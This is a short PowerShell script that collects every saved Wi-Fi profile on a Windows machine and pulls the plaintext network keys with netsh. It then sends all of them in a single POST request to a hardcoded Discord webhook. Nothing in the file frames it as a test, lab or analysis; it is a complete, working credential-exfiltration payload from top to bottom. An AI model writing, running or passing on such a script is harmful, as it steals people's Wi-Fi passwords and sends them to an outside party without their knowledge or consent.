$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {($_ -split ":")[1].Trim()}
$output = ""

foreach ($profile in $wifiProfiles) {
    $details = netsh wlan show profile name="$profile" key=clear
    $output += "`n" + $details
}

$webhook = "https://discord.com/api/webhooks/1348596367936716841/q-6dCI0Q1RPRKizEpmBBSGCbfZZKA5eB6zGsrt-N4ONPBTVHuCnqFzcD1PRAmPPlie6a"
$body = @{ "content" = "```$output```" } | ConvertTo-Json -Compress

Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
